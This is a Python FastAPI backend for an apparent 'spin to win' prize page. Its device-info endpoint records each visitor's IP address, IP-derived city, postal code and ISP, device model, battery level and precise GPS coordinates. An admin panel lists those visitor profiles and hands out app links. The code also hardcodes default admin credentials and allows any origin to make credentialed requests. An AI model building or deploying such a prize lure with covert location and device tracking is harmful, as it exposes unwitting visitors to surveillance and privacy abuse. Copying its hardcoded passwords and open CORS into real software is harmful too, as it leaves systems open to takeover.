import os
import json
import uuid
import time
import hashlib
import httpx
from datetime import datetime, timezone
from pathlib import Path

from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional

app = FastAPI(title="Spin for Enterprise API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- In-memory database (replace with a real DB in production) ---
DATA_DIR = Path("/data") if Path("/data").exists() else Path("./data")
DATA_DIR.mkdir(exist_ok=True)

DB_FILE = DATA_DIR / "database.json"

def load_db():
    if DB_FILE.exists():
        with open(DB_FILE) as f:
            return json.load(f)
    return {"users": {}, "apps": [], "tasks": [], "conversations": [], "bans": []}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f, indent=2, default=str)

# --- Models ---
class DeviceInfo(BaseModel):
    device_brand: Optional[str] = None
    device_model: Optional[str] = None
    device_name: Optional[str] = None
    battery_pct: Optional[int] = None
    charging: Optional[bool] = None
    latitude: Optional[float] = None
    longitude: Optional[float] = None

class WinRequest(BaseModel):
    device_id: str

class AdminLogin(BaseModel):
    username: str
    password: str

class AppLink(BaseModel):
    url: str
    name: Optional[str] = None

class TaskItem(BaseModel):
    title: str
    description: Optional[str] = None
    reward: Optional[str] = None

# --- Auth ---
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "FruckRajeeto")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "Mothero")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

admin_tokens = set()

def verify_admin(request: Request):
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    if token not in admin_tokens:
        raise HTTPException(status_code=401, detail="Unauthorized")

# --- IP Geolocation ---
async def get_geo_from_ip(ip: str):
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.get(f"http://ip-api.com/json/{ip}?fields=country,city,zip,lat,lon,isp", timeout=5)
            if resp.status_code == 200:
                return resp.json()
    except Exception:
        pass
    return {}

# --- Routes ---

@app.post("/api/device-info")
async def receive_device_info(info: DeviceInfo, request: Request):
    client_ip = request.headers.get("X-Forwarded-For", request.client.host)
    if "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    geo = await get_geo_from_ip(client_ip)

    db = load_db()
    user_id = hashlib.md5(client_ip.encode()).hexdigest()[:12]

    user_data = {
        "user_id": user_id,
        "ip": client_ip,
        "country": geo.get("country", "Unknown"),
        "city": geo.get("city", "Unknown"),
        "postal_code": geo.get("zip", "Unknown"),
        "isp": geo.get("isp", "Unknown"),
        "device_brand": info.device_brand,
        "device_model": info.device_model,
        "device_name": info.device_name,
        "battery_pct": info.battery_pct,
        "charging": info.charging,
        "latitude": info.latitude,
        "longitude": info.longitude,
        "last_seen": datetime.now(timezone.utc).isoformat(),
        "first_seen": db["users"].get(user_id, {}).get("first_seen",
                      datetime.now(timezone.utc).isoformat()),
    }

    db["users"][user_id] = user_data
    save_db(db)

    return {"status": "ok", "user_id": user_id}


@app.post("/api/win")
async def handle_win(win: WinRequest, request: Request):
    db = load_db()
    client_ip = request.headers.get("X-Forwarded-For", request.client.host)
    if "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    user_id = hashlib.md5(client_ip.encode()).hexdigest()[:12]

    # Check if banned
    if user_id in db.get("bans", []):
        return {"status": "banned"}

    # Find an unclaimed app link
    app_link = None
    for app_entry in db["apps"]:
        if not app_entry.get("claimed", False):
            app_entry["claimed"] = True
            app_entry["claimed_by"] = user_id
            app_entry["claimed_at"] = datetime.now(timezone.utc).isoformat()
            app_link = app_entry
            break

    save_db(db)

    if app_link and TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        await send_telegram_message(
            win.device_id,
            app_link.get("url", "No link available")
        )

    return {"status": "ok", "has_link": app_link is not None}


async def send_telegram_message(device_id: str, app_url: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        message = (
            f"Hahahahaha I joke u getting nun, Jk im kidding. "
            f"Here ur app:\n\n{app_url}"
        )
        async with httpx.AsyncClient() as client:
            await client.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT_ID, "text": message},
                timeout=10,
            )
    except Exception:
        pass


# --- Admin Routes ---

@app.post("/api/admin/login")
async def admin_login(creds: AdminLogin):
    if creds.username == ADMIN_USERNAME and creds.password == ADMIN_PASSWORD:
        token = uuid.uuid4().hex
        admin_tokens.add(token)
        return {"token": token}
    raise HTTPException(status_code=401, detail="Invalid credentials")


@app.get("/api/admin/users")
async def get_users(request: Request, _=Depends(verify_admin)):
    db = load_db()
    users = list(db["users"].values())
    bans = db.get("bans", [])
    for u in users:
        u["banned"] = u["user_id"] in bans
    return {"users": users}


@app.post("/api/admin/ban/{user_id}")
async def ban_user(user_id: str, _=Depends(verify_admin)):
    db = load_db()
    if "bans" not in db:
        db["bans"] = []
    if user_id not in db["bans"]:
        db["bans"].append(user_id)
    save_db(db)
    return {"status": "banned"}


@app.post("/api/admin/unban/{user_id}")
async def unban_user(user_id: str, _=Depends(verify_admin)):
    db = load_db()
    db["bans"] = [b for b in db.get("bans", []) if b != user_id]
    save_db(db)
    return {"status": "unbanned"}


@app.post("/api/admin/apps")
async def add_app(app_link: AppLink, _=Depends(verify_admin)):
    db = load_db()
    db["apps"].append({
        "id": uuid.uuid4().hex[:8],
        "url": app_link.url,
        "name": app_link.name or app_link.url,
        "claimed": False,
        "claimed_by": None,
        "added_at": datetime.now(timezone.utc).isoformat(),
    })
    save_db(db)
    return {"status": "added"}


@app.get("/api/admin/apps")
async def get_apps(_=Depends(verify_admin)):
    db = load_db()
    return {"apps": db["apps"]}


@app.post("/api/admin/tasks")
async def add_task(task: TaskItem, _=Depends(verify_admin)):
    db = load_db()
    db["tasks"].append({
        "id": uuid.uuid4().hex[:8],
        "title": task.title,
        "description": task.description,
        "reward": task.reward,
        "added_at": datetime.now(timezone.utc).isoformat(),
    })
    save_db(db)
    return {"status": "added"}


@app.get("/api/admin/tasks")
async def get_tasks(_=Depends(verify_admin)):
    db = load_db()
    return {"tasks": db.get("tasks", [])}


@app.get("/api/admin/conversations")
async def get_conversations(_=Depends(verify_admin)):
    db = load_db()
    return {"conversations": db.get("conversations", [])}


@app.get("/api/health")
async def health():
    return {"status": "ok", "time": datetime.now(timezone.utc).isoformat()}
